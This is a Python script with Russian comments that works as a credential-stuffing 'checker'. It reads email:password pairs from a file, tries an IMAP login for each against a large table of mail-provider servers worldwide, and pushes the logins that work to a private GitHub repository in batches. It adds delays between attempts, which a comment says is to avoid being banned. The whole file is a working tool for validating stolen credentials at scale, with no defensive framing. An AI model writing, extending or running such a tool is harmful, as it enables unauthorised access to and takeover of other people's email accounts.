import imaplib
import time
import subprocess
import os
import re
import getpass # Для безопасного ввода токена
from pathlib import Path

# --- НАСТРОЙКИ ---
INPUT_FILE = "accounts.txt" # Файл с аккаунтами в формате email:password
OUTPUT_FILE_NAME = "success.txt" # Имя файла для валидных аккаунтов в репозитории
# GITHUB_REPO_URL будет запрашиваться или можно задать жестко
# GITHUB_TOKEN будет запрашиваться через getpass
LOCAL_REPO_PATH = "temp_repo_for_emails" # Локальная папка для клонирования репозитория
SAVE_INTERVAL = 50  # Каждые N проверок сохранять на GitHub
CHECK_DELAY_SECONDS = 2 # Задержка между проверками, чтобы не забанили

# Обновленный и расширенный список IMAP серверов
IMAP_SERVERS = {
    # Основные провайдеры
    "gmail.com": {"host": "imap.gmail.com", "port": 993, "ssl": True},
    "googlemail.com": {"host": "imap.gmail.com", "port": 993, "ssl": True}, # Alias для gmail
    "outlook.com": {"host": "outlook.office365.com", "port": 993, "ssl": True},
    "hotmail.com": {"host": "outlook.office365.com", "port": 993, "ssl": True},
    "live.com": {"host": "outlook.office365.com", "port": 993, "ssl": True},
    "msn.com": {"host": "outlook.office365.com", "port": 993, "ssl": True},
    "yahoo.com": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True},
    "yahoo.co.jp": {"host": "imap.mail.yahoo.co.jp", "port": 993, "ssl": True},
    "yahoo.co.uk": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True}, # Обычно тот же, что и .com
    "yahoo.de": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True},
    "yahoo.fr": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True},
    "yahoo.it": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True},
    "yahoo.es": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True},
    "yahoo.com.br": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True},
    "rocketmail.com": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True}, # Принадлежит Yahoo
    "ymail.com": {"host": "imap.mail.yahoo.com", "port": 993, "ssl": True}, # Принадлежит Yahoo
    "aol.com": {"host": "imap.aol.com", "port": 993, "ssl": True},
    "yandex.ru": {"host": "imap.yandex.ru", "port": 993, "ssl": True},
    "yandex.com": {"host": "imap.yandex.com", "port": 993, "ssl": True},
    "mail.ru": {"host": "imap.mail.ru", "port": 993, "ssl": True},
    "bk.ru": {"host": "imap.mail.ru", "port": 993, "ssl": True},
    "list.ru": {"host": "imap.mail.ru", "port": 993, "ssl": True},
    "inbox.ru": {"host": "imap.mail.ru", "port": 993, "ssl": True},
    "icloud.com": {"host": "imap.mail.me.com", "port": 993, "ssl": True},
    "me.com": {"host": "imap.mail.me.com", "port": 993, "ssl": True}, # Apple
    "mac.com": {"host": "imap.mail.me.com", "port": 993, "ssl": True}, # Apple

    # Немецкие провайдеры
    "web.de": {"host": "imap.web.de", "port": 993, "ssl": True},
    "gmx.de": {"host": "imap.gmx.net", "port": 993, "ssl": True}, # .net для gmx.de
    "gmx.net": {"host": "imap.gmx.net", "port": 993, "ssl": True},
    "gmx.at": {"host": "imap.gmx.net", "port": 993, "ssl": True}, # Обычно тот же
    "gmx.ch": {"host": "imap.gmx.net", "port": 993, "ssl": True}, # Обычно тот же
    "t-online.de": {"host": "secureimap.t-online.de", "port": 993, "ssl": True},
    "freenet.de": {"host": "mx.freenet.de", "port": 993, "ssl": True}, # или imap.freenet.de
    "arcor.de": {"host": "imap.arcor.de", "port": 993, "ssl": True}, # Сейчас Vodafone
    "vodafone.de": {"host": "imap.vodafone.de", "port": 993, "ssl": True},
    "kabelmail.de": {"host": "imap.kabelmail.de", "port": 993, "ssl": True}, # Vodafone Kabel
    "online.de": {"host": "imap.online.de", "port": 993, "ssl": True}, # 1&1
    "1und1.de": {"host": "imap.1und1.de", "port": 993, "ssl": True}, # IONOS
    "ionos.co.uk": {"host": "imap.ionos.co.uk", "port": 993, "ssl": True},
    "ionos.de": {"host": "imap.ionos.de", "port": 993, "ssl": True},
    "strato.de": {"host": "imap.strato.de", "port": 993, "ssl": True},
    "epost.de": {"host": "imap.epost.de", "port": 993, "ssl": True}, # Deutsche Post
    "mail.de": {"host": "imap.mail.de", "port": 993, "ssl": True},
    "osnanet.de": {"host": "imap.osnanet.de", "port": 993, "ssl": True}, # EWE TEL

    # Французские провайдеры
    "orange.fr": {"host": "imap.orange.fr", "port": 993, "ssl": True},
    "wanadoo.fr": {"host": "imap.orange.fr", "port": 993, "ssl": True}, # Принадлежит Orange
    "sfr.fr": {"host": "imap.sfr.fr", "port": 993, "ssl": True},
    "laposte.net": {"host": "imap.laposte.net", "port": 993, "ssl": True},
    "free.fr": {"host": "imap.free.fr", "port": 993, "ssl": True},
    "neuf.fr": {"host": "imap.sfr.fr", "port": 993, "ssl": True}, # Принадлежит SFR
    "cegetel.net": {"host": "imap.sfr.fr", "port": 993, "ssl": True}, # Принадлежит SFR
    "club-internet.fr": {"host": "imap.sfr.fr", "port": 993, "ssl": True}, # Принадлежит SFR
    "bbox.fr": {"host": "imap4.bbox.fr", "port": 993, "ssl": True}, # Bouygues Telecom

    # Итальянские провайдеры
    "virgilio.it": {"host": "in.virgilio.it", "port": 993, "ssl": True}, # или imap.virgilio.it
    "alice.it": {"host": "in.alice.it", "port": 993, "ssl": True}, # TIM
    "tim.it": {"host": "imap.tim.it", "port": 993, "ssl": True},
    "tin.it": {"host": "imap.tin.it", "port": 993, "ssl": True}, # TIM
    "libero.it": {"host": "imapmail.libero.it", "port": 993, "ssl": True},
    "tiscali.it": {"host": "imap.tiscali.it", "port": 993, "ssl": True},
    "fastwebnet.it": {"host": "imap.fastwebnet.it", "port": 993, "ssl": True},
    "pec.it": {"host": "imaps.pec.aruba.it", "port": 993, "ssl": True}, # Aruba PEC
    "aruba.it": {"host": "imaps.aruba.it", "port": 993, "ssl": True}, # Aruba non-PEC

    # Польские провайдеры
    "wp.pl": {"host": "imap.wp.pl", "port": 993, "ssl": True},
    "o2.pl": {"host": "poczta.o2.pl", "port": 993, "ssl": True}, # или imap.tlen.pl
    "tlen.pl": {"host": "imap.tlen.pl", "port": 993, "ssl": True},
    "interia.pl": {"host": "poczta.interia.pl", "port": 993, "ssl": True},
    "interia.eu": {"host": "poczta.interia.pl", "port": 993, "ssl": True},
    "poczta.onet.pl": {"host": "imap.poczta.onet.pl", "port": 993, "ssl": True},
    "onet.pl": {"host": "imap.poczta.onet.pl", "port": 993, "ssl": True},
    "op.pl": {"host": "imap.poczta.onet.pl", "port": 993, "ssl": True}, # Onet
    "vp.pl": {"host": "imap.wp.pl", "port": 993, "ssl": True}, # WP
    "spoko.pl": {"host": "imap.poczta.onet.pl", "port": 993, "ssl": True}, # Onet
    "gazeta.pl": {"host": "imap.gazeta.pl", "port": 993, "ssl": True}, # Agora (может быть Google Workspace)
    "go2.pl": {"host": "poczta.o2.pl", "port": 993, "ssl": True}, # o2
    "poczta.fm": {"host": "imap.poczta.fm", "port": 993, "ssl": True}, # Interia

    # Чешские/Словацкие провайдеры
    "seznam.cz": {"host": "imap.seznam.cz", "port": 993, "ssl": True},
    "email.cz": {"host": "imap.seznam.cz", "port": 993, "ssl": True}, # Seznam
    "post.cz": {"host": "imap.post.cz", "port": 993, "ssl": True}, # Seznam/Centrum
    "centrum.cz": {"host": "imap.centrum.cz", "port": 993, "ssl": True},
    "atlas.cz": {"host": "imap.centrum.cz", "port": 993, "ssl": True}, # Centrum
    "volny.cz": {"host": "imap.volny.cz", "port": 993, "ssl": True}, # Volny
    "zoznam.sk": {"host": "imap.zoznam.sk", "port": 993, "ssl": True},
    "azet.sk": {"host": "imap.azet.sk", "port": 993, "ssl": True},
    "centrum.sk": {"host": "imap.centrum.sk", "port": 993, "ssl": True},

    # Испанские/Португальские провайдеры
    "telefonica.net": {"host": "imap.telefonica.net", "port": 993, "ssl": True}, # Movistar
    "movistar.es": {"host": "imap.movistar.es", "port": 993, "ssl": True},
    "ya.com": {"host": "imap.ya.com", "port": 993, "ssl": True}, # Orange ES
    "eresmas.com": {"host": "imap.orange.es", "port": 993, "ssl": True}, # Orange ES
    "sapo.pt": {"host": "imap.sapo.pt", "port": 993, "ssl": True},

    # Британские/Ирландские провайдеры
    "talktalk.net": {"host": "mail.talktalk.net", "port": 993, "ssl": True},
    "tiscali.co.uk": {"host": "imap.tiscali.co.uk", "port": 993, "ssl": True}, # TalkTalk
    "virginmedia.com": {"host": "imap.virginmedia.com", "port": 993, "ssl": True},
    "ntlworld.com": {"host": "imap.ntlworld.com", "port": 993, "ssl": True}, # Virgin Media
    "blueyonder.co.uk": {"host": "imap.blueyonder.co.uk", "port": 993, "ssl": True}, # Virgin Media
    "sky.com": {"host": "imap.tools.sky.com", "port": 993, "ssl": True}, # Yahoo mail backend
    "btinternet.com": {"host": "mail.btinternet.com", "port": 993, "ssl": True}, # Yahoo mail backend
    "btopenworld.com": {"host": "mail.btinternet.com", "port": 993, "ssl": True}, # BT

    # Американские/Канадские провайдеры
    "sbcglobal.net": {"host": "imap.mail.att.net", "port": 993, "ssl": True}, # AT&T/Yahoo
    "pacbell.net": {"host": "imap.mail.att.net", "port": 993, "ssl": True}, # AT&T/Yahoo
    "bellsouth.net": {"host": "imap.mail.att.net", "port": 993, "ssl": True}, # AT&T/Yahoo
    "ameritech.net": {"host": "imap.mail.att.net", "port": 993, "ssl": True}, # AT&T/Yahoo
    "verizon.net": {"host": "imap.aol.com", "port": 993, "ssl": True}, # Verizon mail is now AOL
    "comcast.net": {"host": "imap.comcast.net", "port": 993, "ssl": True}, # Xfinity
    "cox.net": {"host": "imap.cox.net", "port": 993, "ssl": True},
    "earthlink.net": {"host": "imap.earthlink.net", "port": 993, "ssl": True},
    "charter.net": {"host": "mobile.charter.net", "port": 993, "ssl": True}, # Spectrum
    "rr.com": {"host": "mail.twc.com", "port": 993, "ssl": True}, # RoadRunner/Spectrum (общий для поддоменов типа cfl.rr.com, nycap.rr.com и т.д.)
    "twc.com": {"host": "mail.twc.com", "port": 993, "ssl": True}, # Time Warner Cable/Spectrum
    "optonline.net": {"host": "mail.optonline.net", "port": 993, "ssl": True}, # Optimum
    "windstream.net": {"host": "imap.windstream.net", "port": 993, "ssl": True},
    "centurylink.net": {"host": "mail.centurylink.net", "port": 993, "ssl": True},
    "q.com": {"host": "mail.centurylink.net", "port": 993, "ssl": True}, # CenturyLink
    "embarqmail.com": {"host": "imap.centurylink.net", "port": 993, "ssl": True}, # CenturyLink
    "juno.com": {"host": "imap.juno.com", "port": 993, "ssl": True},
    "netzero.net": {"host": "imap.netzero.net", "port": 993, "ssl": True},
    "aim.com": {"host": "imap.aol.com", "port": 993, "ssl": True}, # AOL
    "videotron.ca": {"host": "imap.videotron.ca", "port": 993, "ssl": True},
    "bell.net": {"host": "imap.bell.net", "port": 993, "ssl": True},
    "sympatico.ca": {"host": "imap.bell.net", "port": 993, "ssl": True}, # Bell
    "rogers.com": {"host": "imap.rogers.com", "port": 993, "ssl": True}, # Yahoo mail backend
    "shaw.ca": {"host": "imap.shaw.ca", "port": 993, "ssl": True},
    "telus.net": {"host": "imap.telus.net", "port": 993, "ssl": True},

    # Азиатские провайдеры
    "eyou.com": {"host": "imap.eyou.com", "port": 993, "ssl": True}, # Китай
    "sina.com": {"host": "imap.sina.com", "port": 993, "ssl": True}, # Китай
    "sina.cn": {"host": "imap.sina.com", "port": 993, "ssl": True}, # Китай
    "163.com": {"host": "imap.163.com", "port": 993, "ssl": True}, # NetEase Китай
    "126.com": {"host": "imap.126.com", "port": 993, "ssl": True}, # NetEase Китай
    "yeah.net": {"host": "imap.yeah.net", "port": 993, "ssl": True}, # NetEase Китай
    "aliyun.com": {"host": "imap.aliyun.com", "port": 993, "ssl": True}, # Alibaba Китай
    "qq.com": {"host": "imap.qq.com", "port": 993, "ssl": True}, # Tencent Китай
    "foxmail.com": {"host": "imap.qq.com", "port": 993, "ssl": True}, # Tencent Китай
    "rediffmail.com": {"host": "imap.rediffmail.com", "port": 993, "ssl": True}, # Индия
    "naver.com": {"host": "imap.naver.com", "port": 993, "ssl": True}, # Корея
    "daum.net": {"host": "imap.daum.net", "port": 993, "ssl": True}, # Корея (Kakao)
    "hanmail.net": {"host": "imap.daum.net", "port": 993, "ssl": True}, # Корея (Kakao)
    "nate.com": {"host": "imap.nate.com", "port": 993, "ssl": True}, # Корея

    # Другие европейские
    "lycos.de": {"host": "imap.lycos.de", "port": 993, "ssl": True}, # Lycos Europe
    "lycos.com": {"host": "imap.lycos.com", "port": 993, "ssl": True},
    "tripod.com": {"host": "imap.lycos.com", "port": 993, "ssl": True}, # Lycos
    "angelfire.com": {"host": "imap.lycos.com", "port": 993, "ssl": True}, # Lycos
    "rambler.ru": {"host": "imap.rambler.ru", "port": 993, "ssl": True},
    "autorambler.ru": {"host": "imap.rambler.ru", "port": 993, "ssl": True},
    "lenta.ru": {"host": "imap.rambler.ru", "port": 993, "ssl": True}, # Почта Lenta.ru на Рамблере
    "i.ua": {"host": "imap.i.ua", "port": 993, "ssl": True}, # Украина
    "meta.ua": {"host": "imap.meta.ua", "port": 993, "ssl": True}, # Украина
    "ukr.net": {"host": "imap.ukr.net", "port": 993, "ssl": True}, # Украина
    "bigmir.net": {"host": "imap.bigmir.net", "port": 993, "ssl": True}, # Украина
    "tyt.by": {"host": "imap.yandex.ru", "port": 993, "ssl": True}, # TUT.BY (Беларусь) использует Яндекс.Почту
    "inbox.lv": {"host": "imap.inbox.lv", "port": 993, "ssl": True}, # Латвия
    "bluewin.ch": {"host": "imaps.bluewin.ch", "port": 993, "ssl": True}, # Swisscom
    "hispeed.ch": {"host": "imap.hispeed.ch", "port": 993, "ssl": True}, # Sunrise UPC
    "sunrise.ch": {"host": "imap.sunrise.ch", "port": 993, "ssl": True}, # Sunrise UPC
    "a1.net": {"host": "imap.a1.net", "port": 993, "ssl": True}, # Австрия
    "kabsi.at": {"host": "pop.kabsi.at", "port": 993, "ssl": True}, # Австрия (может быть pop, но часто и imap)
    "hostprofis.at": {"host": "securemail.hostprofis.at", "port": 993, "ssl": True}, # Австрийский хостинг
    "home.nl": {"host": "imap.home.nl", "port": 993, "ssl": True}, # Ziggo Нидерланды
    "ziggo.nl": {"host": "imap.ziggo.nl", "port": 993, "ssl": True},
    "planet.nl": {"host": "imap.planet.nl", "port": 993, "ssl": True}, # KPN Нидерланды
    "kpnmail.nl": {"host": "imap.kpnmail.nl", "port": 993, "ssl": True}, # KPN
    "tele2.nl": {"host": "imap.tele2.nl", "port": 993, "ssl": True},
    "telenet.be": {"host": "imap.telenet.be", "port": 993, "ssl": True}, # Бельгия
    "skynet.be": {"host": "imap.skynet.be", "port": 993, "ssl": True}, # Proximus Бельгия
    "proximus.be": {"host": "imap.proximus.be", "port": 993, "ssl": True},
    "voo.be": {"host": "mail.voo.be", "port": 993, "ssl": True}, # Бельгия
    "kolumbus.fi": {"host": "mail.kolumbus.fi", "port": 993, "ssl": True}, # Elisa Финляндия
    "elisa.fi": {"host": "imap.elisa.fi", "port": 993, "ssl": True},
    "saunalahti.fi": {"host": "imap.saunalahti.fi", "port": 993, "ssl": True}, # Elisa
    "mail.dk": {"host": "mail.post.tele.dk", "port": 993, "ssl": True}, # TDC Дания
    "mailme.dk": {"host": "mail.mailme.dk", "port": 993, "ssl": True}, # Дания, возможно тот же TDC
    "dir.bg": {"host": "imap.dir.bg", "port": 993, "ssl": True}, # Болгария
    "abv.bg": {"host": "imap.abv.bg", "port": 993, "ssl": True}, # Болгария
    "forthnet.gr": {"host": "imap.forthnet.gr", "port": 993, "ssl": True}, # Греция (Nova)
    "otenet.gr": {"host": "mail.otenet.gr", "port": 993, "ssl": True}, # Греция (Cosmote)
    "hol.gr": {"host": "imap.hol.gr", "port": 993, "ssl": True}, # Греция (Vodafone)

    # Южная Америка
    "terra.com.br": {"host": "imap.terra.com.br", "port": 993, "ssl": True},
    "uol.com.br": {"host": "imap.uol.com.br", "port": 993, "ssl": True},
    "bol.com.br": {"host": "imap.bol.com.br", "port": 993, "ssl": True}, # UOL
    "ig.com.br": {"host": "imap.ig.com.br", "port": 993, "ssl": True},
    "sion.com": {"host": "pop.sion.com", "port": 993, "ssl": True}, # Аргентина (может быть pop, но часто и imap)

    # Австралия/Новая Зеландия
    "bigpond.com": {"host": "imap.telstra.com", "port": 993, "ssl": True}, # Telstra
    "dodo.com.au": {"host": "imap.dodo.com.au", "port": 993, "ssl": True},
    "optusnet.com.au": {"host": "mail.optusnet.com.au", "port": 993, "ssl": True},
    "iinet.net.au": {"host": "mail.iinet.net.au", "port": 993, "ssl": True},
    "xtra.co.nz": {"host": "imap.xtra.co.nz", "port": 993, "ssl": True}, # Spark NZ
    "slingshot.co.nz": {"host": "imap.slingshot.co.nz", "port": 993, "ssl": True},

    # Домены от хостинг-провайдеров или общие (могут требовать имя пользователя полностью email@domain.com)
    # Эти часто зависят от конкретной конфигурации сервера хостинга
    "*.hostinger.com": {"host": "imap.hostinger.com", "port": 993, "ssl": True}, # Пример для Hostinger
    "*.dreamhost.com": {"host": "imap.dreamhost.com", "port": 993, "ssl": True}, # Пример для DreamHost
    "*.bluehost.com": {"host": "boxXXX.bluehost.com", "port": 993, "ssl": True}, # XXX - номер сервера
    "*.siteground.com": {"host": "mail.siteground.com", "port": 993, "ssl": True}, # или по имени сервера
    "*.godaddy.com": {"host": "imap.secureserver.net", "port": 993, "ssl": True}, # GoDaddy Workspace Email
    "*.zoho.com": {"host": "imappro.zoho.com", "port": 993, "ssl": True}, # Zoho Mail
}

# Попытка определить ветку по умолчанию (main или master)
def get_default_branch(repo_path):
    try:
        # Проверяем существование локальной ветки main
        result_main = subprocess.run(["git", "show-ref", "--verify", "--quiet", "refs/heads/main"], cwd=repo_path, check=False)
        if result_main.returncode == 0:
            return "main"
        # Проверяем существование локальной ветки master
        result_master = subprocess.run(["git", "show-ref", "--verify", "--quiet", "refs/heads/master"], cwd=repo_path, check=False)
        if result_master.returncode == 0:
            return "master"
        # Если не нашли, пытаемся узнать у remote (может не сработать до первого pull/fetch)
        result_remote = subprocess.run(["git", "remote", "show", "origin"], cwd=repo_path, capture_output=True, text=True, check=False)
        if result_remote.returncode == 0:
            match = re.search(r"HEAD branch:\s*(\S+)", result_remote.stdout)
            if match:
                return match.group(1)
        return "main" # По умолчанию, если не удалось определить
    except Exception:
        return "main" # Фоллбэк

def get_imap_details(email):
    try:
        domain = email.split('@')[1].lower()
        if domain in IMAP_SERVERS:
            return IMAP_SERVERS[domain]
        
        # Проверка для поддоменов (например, mail.example.com -> example.com)
        parts = domain.split('.')
        if len(parts) > 2:
            # Пробуем последние две части (example.com)
            base_domain_2 = ".".join(parts[-2:])
            if base_domain_2 in IMAP_SERVERS:
                return IMAP_SERVERS[base_domain_2]
            # Пробуем последние три части (sub.example.com), если это известный TLD типа co.uk
            if len(parts) > 3 and ".".join(parts[-2:]) in ["co.uk", "com.au", "com.br", "co.jp", "co.nz", "ac.uk", "gov.uk"]: # Дополнить список TLD
                 base_domain_3 = ".".join(parts[-3:])
                 if base_domain_3 in IMAP_SERVERS:
                     return IMAP_SERVERS[base_domain_3]

        # Проверка для общих хостинговых доменов (например, *.godaddy.com)
        for pattern, config in IMAP_SERVERS.items():
            if pattern.startswith("*."):
                host_domain = pattern[2:]
                if domain.endswith(host_domain):
                    return config
        
        # Если это .edu или .ac.uk, часто это Google или Microsoft
        if domain.endswith(".edu") or ".edu." in domain or domain.endswith(".ac.uk") or ".ac." in domain:
            print(f"[?] Для {domain} (edu/ac) пробую стандартные Gmail/Outlook IMAP...")
            # Пытаемся сначала Gmail
            if "gmail.com" in IMAP_SERVERS: return IMAP_SERVERS["gmail.com"]
            # Потом Outlook
            if "outlook.com" in IMAP_SERVERS: return IMAP_SERVERS["outlook.com"]


    except IndexError:
        pass
    print(f"[-] Не найдены настройки IMAP для домена в {email}")
    return None

def check_email_validity(email, password):
    imap_details = get_imap_details(email)
    if not imap_details:
        return False

    host = imap_details['host']
    port = imap_details['port']
    use_ssl = imap_details.get('ssl', True)

    mail_server = None
    try:
        if use_ssl:
            mail_server = imaplib.IMAP4_SSL(host, port)
        else:
            mail_server = imaplib.IMAP4(host, port)
        
        mail_server.socket().settimeout(20) # Увеличиваем таймаут

        mail_server.login(email, password)
        print(f"[+] Успешный вход: {email}")
        return True
    except imaplib.IMAP4.error as e:
        # Распространенные ошибки аутентификации
        err_str = str(e).lower()
        if "authenticationfailed" in err_str or \
           "invalid credentials" in err_str or \
           "login failed" in err_str or \
           "log in via your web browser" in err_str or \
           "application-specific password required" in err_str or \
           "password incorrect" in err_str or \
           "user is authenticated but not connected" in err_str: # Иногда бывает у Outlook
            print(f"[-] Ошибка аутентификации для {email}: {e}")
        elif "account is locked" in err_str or "temporary issue" in err_str:
            print(f"[-] Аккаунт {email} возможно заблокирован или испытывает временные проблемы: {e}")
        else:
            print(f"[-] Ошибка IMAP для {email}: {e}")
        return False
    except Exception as e:
        print(f"[-] Непредвиденная ошибка при проверке {email}: {e}")
        return False
    finally:
        if mail_server:
            try:
                mail_server.logout()
            except:
                pass

def run_git_command(command, cwd, github_token_for_url=None):
    """Выполняет команду Git. Токен используется для формирования URL, если передан."""
    cmd_to_run = list(command) 

    if github_token_for_url:
        for i, part in enumerate(cmd_to_run):
            if "https://" in part and "github.com" in part and "@" not in part:
                # Ensure we don't double-add token if it's already there (e.g. from a previous manual config)
                if f"{github_token_for_url}@" not in part:
                     cmd_to_run[i] = part.replace("https://", f"https://{github_token_for_url}@")
                break 

    display_command_str = ' '.join(cmd_to_run)
    if github_token_for_url:
        display_command_str = display_command_str.replace(github_token_for_url, "***TOKEN***")
    
    print(f"Git command (masked): {display_command_str} in {cwd}")

    try:
        # Для Codespaces и некоторых систем может быть лучше установить GIT_TERMINAL_PROMPT=0
        env = os.environ.copy()
        env["GIT_TERMINAL_PROMPT"] = "0" # Отключает интерактивные запросы пароля
        
        result = subprocess.run(cmd_to_run, cwd=cwd, capture_output=True, text=True, check=False, encoding='utf-8', errors='replace', env=env)
        
        if result.returncode != 0:
            print(f"Git command failed. Return code: {result.returncode}")
            print(f"Stdout: {result.stdout.strip()}")
            print(f"Stderr: {result.stderr.strip()}")
            # Если ошибка связана с аутентификацией, но токен был в URL, это странно
            if "authentication failed" in result.stderr.lower() and github_token_for_url and f"{github_token_for_url}@" in ' '.join(cmd_to_run):
                print("Authentication failed despite token in URL. Check token permissions and repository URL.")
            return False
        return True
    except FileNotFoundError:
        print("Ошибка: Git не найден. Убедитесь, что он установлен и добавлен в PATH.")
        return False
    except Exception as e:
        print(f"Неожиданная ошибка при выполнении Git команды: {e}")
        return False


def setup_github_repo(github_repo_url, github_token):
    local_repo_path_obj = Path(LOCAL_REPO_PATH)
    if local_repo_path_obj.exists():
        print(f"Репозиторий {LOCAL_REPO_PATH} существует. Попытка очистить и переклонировать...")
        try:
            import shutil
            shutil.rmtree(local_repo_path_obj)
        except Exception as e_rm:
            print(f"Ошибка при удалении старого репозитория {local_repo_path_obj}: {e_rm}. Попробуйте удалить вручную.")
            return False
    
    print(f"Клонирую репозиторий {github_repo_url} в {LOCAL_REPO_PATH}...")
    local_repo_path_obj.mkdir(parents=True, exist_ok=True)
    if not run_git_command(["git", "clone", "--depth", "1", github_repo_url, "."], cwd=str(local_repo_path_obj), github_token_for_url=github_token):
        print("Не удалось клонировать репозиторий. Проверьте URL, токен и права доступа.")
        return False
    
    run_git_command(["git", "config", "user.email", "actions@github.com"], cwd=str(local_repo_path_obj))
    run_git_command(["git", "config", "user.name", "GitHub Actions (Email Checker)"], cwd=str(local_repo_path_obj))
    return True

def save_to_github(valid_accounts_batch, github_repo_url, github_token):
    if not valid_accounts_batch:
        print("Нет валидных аккаунтов для сохранения в этой пачке.")
        return

    local_repo_path_str = str(Path(LOCAL_REPO_PATH))
    success_file_path = Path(LOCAL_REPO_PATH) / OUTPUT_FILE_NAME
    
    # Перед записью и коммитом, делаем pull, чтобы получить последние изменения
    # Это особенно важно, если скрипт может запускаться параллельно или с перерывами
    print("Обновление репозитория перед сохранением (git pull)...")
    default_branch_pull = get_default_branch(local_repo_path_str) # Получаем ветку для pull
    if not run_git_command(["git", "pull", "origin", default_branch_pull], cwd=local_repo_path_str, github_token_for_url=github_token):
         print(f"Не удалось выполнить git pull origin {default_branch_pull}. Возможны конфликты при push. Продолжаем с осторожностью.")
         # Если pull не удался, можно либо прервать, либо попытаться сохранить локально, либо рискнуть push.
         # Для простоты, пока продолжаем.

    print(f"Сохранение {len(valid_accounts_batch)} валидных аккаунтов в {success_file_path}...")
    try:
        # Прочитаем существующие записи, чтобы избежать дубликатов в этой сессии
        existing_valid_accounts = set()
        if success_file_path.exists():
            with open(success_file_path, "r", encoding="utf-8") as f_read:
                for line in f_read:
                    existing_valid_accounts.add(line.strip())
        
        new_accounts_to_write = []
        for acc in valid_accounts_batch:
            if acc not in existing_valid_accounts:
                new_accounts_to_write.append(acc)
                existing_valid_accounts.add(acc) # Добавляем в сет, чтобы не записать дважды из batch

        if not new_accounts_to_write:
            print("Все аккаунты из этой пачки уже присутствуют в success.txt. Пропускаю запись.")
            return

        with open(success_file_path, "a", encoding="utf-8") as f_append:
            for acc in new_accounts_to_write:
                f_append.write(f"{acc}\n")
        print(f"Добавлено {len(new_accounts_to_write)} новых уникальных аккаунтов.")

    except IOError as e:
        print(f"Ошибка записи в файл {success_file_path}: {e}")
        return

    if not run_git_command(["git", "add", OUTPUT_FILE_NAME], cwd=local_repo_path_str):
        print("Ошибка git add. Пропускаю сохранение.")
        return

    commit_message = f"Добавлено {len(new_accounts_to_write)} новых валидных аккаунтов"
    status_check = subprocess.run(["git", "status", "--porcelain"], cwd=local_repo_path_str, capture_output=True, text=True)
    if not status_check.stdout.strip() or OUTPUT_FILE_NAME not in status_check.stdout:
        print("Нет изменений для коммита (файл success.txt не изменился или не был добавлен).")
        return

    if not run_git_command(["git", "commit", "-m", commit_message], cwd=local_repo_path_str):
        print("Ошибка git commit. Пропускаю сохранение.")
        return

    default_branch_push = get_default_branch(local_repo_path_str)
    print(f"Отправка изменений на GitHub в ветку {default_branch_push}...")
    
    if not run_git_command(["git", "push", "origin", f"HEAD:{default_branch_push}"], cwd=local_repo_path_str, github_token_for_url=github_token):
        print("Не удалось отправить изменения на GitHub.")
    else:
        print("Изменения успешно отправлены на GitHub.")


def main():
    print("--- Скрипт для проверки Email аккаунтов и сохранения на GitHub ---")
    
    github_repo_url_for_results = input("Введите URL вашего ПРИВАТНОГО GitHub репозитория для СОХРАНЕНИЯ РЕЗУЛЬТАТОВ (success.txt): ").strip()
    if not github_repo_url_for_results.startswith("https://github.com/") or not github_repo_url_for_results.endswith(".git"):
        print("Неверный формат URL репозитория GitHub для результатов. Пример: https://github.com/username/private-results-repo.git")
        return

    github_token = getpass.getpass("Введите ваш GitHub Personal Access Token (не будет отображаться): ").strip()
    if not github_token:
        print("GitHub PAT не может быть пустым.")
        return

    if not Path(INPUT_FILE).exists():
        print(f"Ошибка: Файл {INPUT_FILE} не найден в текущей директории ({Path.cwd()}).")
        print("Убедитесь, что файл accounts.txt находится рядом со скриптом.")
        return
        
    if not setup_github_repo(github_repo_url_for_results, github_token):
        print("Не удалось настроить GitHub репозиторий для результатов. Выход.")
        return

    accounts = []
    try:
        with open(INPUT_FILE, "r", encoding="utf-8", errors='ignore') as f: # errors='ignore' для проблемных символов
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line or ":" not in line:
                    if line: # Если строка не пустая, но без двоеточия
                        print(f"[Предупреждение] Строка {line_num} в {INPUT_FILE} имеет неверный формат: '{line}'. Пропускается.")
                    continue
                accounts.append(line)
    except FileNotFoundError: # Эта проверка уже есть выше, но на всякий случай
        print(f"Ошибка: Файл {INPUT_FILE} не найден.")
        return
    except Exception as e:
        print(f"Ошибка при чтении файла {INPUT_FILE}: {e}")
        return

    if not accounts:
        print(f"Файл {INPUT_FILE} пуст или не содержит аккаунтов в правильном формате. Завершение работы.")
        return

    print(f"Найдено {len(accounts)} аккаунтов для проверки из {INPUT_FILE}.")

    checked_count = 0
    total_to_check = len(accounts)
    valid_accounts_batch = []

    for i, account_line in enumerate(accounts):
        try:
            email, password = account_line.split(":", 1)
            email = email.strip()
            password = password.strip()
        except ValueError:
            print(f"[Предупреждение] Ошибка разбора строки {i+1}: '{account_line}'. Пропускается.")
            continue


        print(f"\n--- Проверка {i + 1}/{total_to_check}: {email} ---")

        if check_email_validity(email, password):
            valid_accounts_batch.append(f"{email}:{password}")
        
        checked_count += 1
        
        if checked_count > 0 and checked_count % SAVE_INTERVAL == 0 :
            if valid_accounts_batch:
                print(f"\nДостигнут интервал сохранения ({SAVE_INTERVAL} проверок). Сохранение на GitHub...")
                save_to_github(valid_accounts_batch, github_repo_url_for_results, github_token)
                valid_accounts_batch = [] 
            else:
                print(f"\nДостигнут интервал сохранения ({SAVE_INTERVAL} проверок), но нет валидных аккаунтов для сохранения в этой пачке.")
        
        if i < total_to_check - 1: 
            print(f"Задержка на {CHECK_DELAY_SECONDS} секунд...")
            time.sleep(CHECK_DELAY_SECONDS)

    if valid_accounts_batch:
        print("\nЗавершение проверки. Сохранение оставшихся валидных аккаунтов на GitHub...")
        save_to_github(valid_accounts_batch, github_repo_url_for_results, github_token)

    print("\nПроверка завершена.")
    print(f"Локальная копия репозитория для результатов находится в папке: {Path(LOCAL_REPO_PATH).resolve()}")

if __name__ == "__main__":
    main()
